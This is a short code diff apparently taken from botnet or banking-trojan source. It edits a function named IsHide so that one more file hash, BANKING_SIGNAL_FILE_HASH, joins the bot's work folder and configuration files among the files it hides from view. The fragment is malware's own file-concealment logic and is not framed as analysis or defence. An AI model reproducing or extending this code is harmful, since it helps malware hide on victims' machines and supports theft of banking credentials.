@@ -245,7 +245,8 @@ BOOL IsHide( DWORD dwFileHash )
 	     dwFileHash == BOT::GetWorkFolderHash() ||
 	     dwFileHash == BOT_CFGN_HASH ||
 		 dwFileHash == BOT_STAV_HASH ||
-		 dwFileHash == BOT_MNAV_HASH
+		 dwFileHash == BOT_MNAV_HASH ||
+		 dwFileHash == BANKING_SIGNAL_FILE_HASH
 		 )
 	{
 		return TRUE;
